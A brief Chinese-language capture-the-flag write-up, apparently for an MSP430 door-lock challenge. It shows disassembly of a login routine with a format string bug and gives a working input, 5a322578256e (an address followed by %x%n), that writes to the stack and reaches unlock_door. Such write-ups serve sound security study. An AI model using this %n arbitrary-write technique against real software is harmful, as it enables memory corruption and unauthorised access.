```
漏洞

login
4476:  814f 0000      mov	r15, 0x0(sp)
447a:  0b12           push	r11              ; r11 指向 password (即 username:password)
447c:  b012 c845      call	#0x45c8 <printf>

典型的 format string 漏洞
以高階語言表示，即下面二行

scanf("%s", buf);
printf(buf);


解題流程

login
448a:  8193 0000      tst	0x0(sp)
448e:  0324           jz	#0x4496 <main+0x5e>
4490:  b012 da44      call	#0x44da <unlock_door>

若要 unlock_door 則必須讓 0x0(sp) 的值不等於 0
我們可以透過 format string attack 將該位址任意寫值 (利用 %n)

此處我的 sp 為 325a
因此，輸入 5a322578256e 即可寫入

note:
%: 0x25 (ascii)
x: 0x78
n: 0x6e

在 C 我們會用 %6$n 寫入 (x86-64)
但這個系統不能用 $ 字號的方式控參數
google 後的結果發現 位址%x 就能將目標轉移到該位址
因此 位址%x%n 就能達到任意位址寫入

```
